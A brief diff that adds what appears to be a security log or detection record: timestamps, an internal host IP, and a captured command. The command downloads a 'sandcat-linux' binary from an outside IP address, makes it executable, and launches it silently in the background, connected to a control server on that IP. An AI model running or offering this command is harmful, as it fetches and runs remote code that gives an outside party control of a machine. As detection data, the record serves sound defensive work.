@@ -1,0 +1,7 @@
+[occurTime]
+2022-03-25 15:16:18
+2022-03-25 15:16:30
+[hostIp]
+192.168.0.155
+[pCommand]
+curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &"
